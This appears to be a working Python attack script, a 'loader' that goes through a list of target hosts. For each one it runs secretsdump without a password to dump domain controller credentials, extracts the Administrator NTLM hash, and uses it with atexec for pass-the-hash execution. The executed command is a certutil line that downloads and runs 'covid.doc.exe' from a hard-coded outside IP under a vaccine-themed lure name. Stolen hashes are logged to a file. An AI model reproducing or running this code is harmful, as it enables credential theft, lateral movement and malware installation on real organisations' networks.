#!/usr/bin/env python3
import os
import sys
import colorama

g = "\033[0;32m"
r = "\033[0;31m"
c = "\033[36m"
d = "\033[0m"
total = c+'[+]'+g+' Loader: '+d+str(len(open(sys.argv[1]).readlines()))+g+' Bots' + d
print(total)
cmd = open(sys.argv[1]).read().splitlines()
for line in cmd:
 #print(line)
 try:
        cmz = line.split('@')
        o = 'python3 secretsdump.py -just-dc '+cmz[0].split('$')[0]+'$@'+cmz[1] +' -no-pass -outputfile ' + cmz[1]
        print(g+'<secretsdump> '+ d+ cmz[0].split('$')[0]+'$@'+cmz[1])
        os.system(o)
        if (':' in open(cmz[1]+".ntds").read()):
                f = open(str(cmz[1])+".ntds").readline().rstrip()
                print(f)
                hashes = ':'+f.split(':')[3]
                u = f.split(':')[0]
                if ('\\' in u):
                        u = f.split('\\')[1]
                if (u == ''):
                        u = 'Administrator'
                localgroup = u
                if (localgroup == ''):
                        localgroup = 'Administrator'
                elif (localgroup == 'Administrador'):
                        localgroup = 'Administradores'
                elif (localgroup == 'Administrateur'):
                        localgroup = 'Administrateurs'
                elif (localgroup == 'Администратор'):
                        localgroup = 'Администраторы'
                c = cmz[0].split('/')[0]+'/'+u+'@'+cmz[1]
                payload = '"certutil -urlcache -split -f http://125.212.248.62/covid.doc.exe C:/ProgramData/vaccin-covid.doc.exe && C:/ProgramData/vaccin-covid.doc.exe"'
                        #ps = 'python3 psexec.py -hashes ' +hashes + ' ' + c
                atexec = 'python3 atexec.py -hashes ' + hashes + ' ' + c + ' ' + payload
                print(g+'<atexec> '+d +hashes+ ' ' +c)
                #print(hashes + ' ' + c + '|lulzkid|N0th1ng@!')
                with open('vps.txt', 'a+') as f:
                        f.write(hashes + ' ' + c +'\n')
                os.system(atexec)
                pass
        else:
                pass
 except KeyboardInterrupt:
        pass
 except FileNotFoundError:
                print('----')
                pass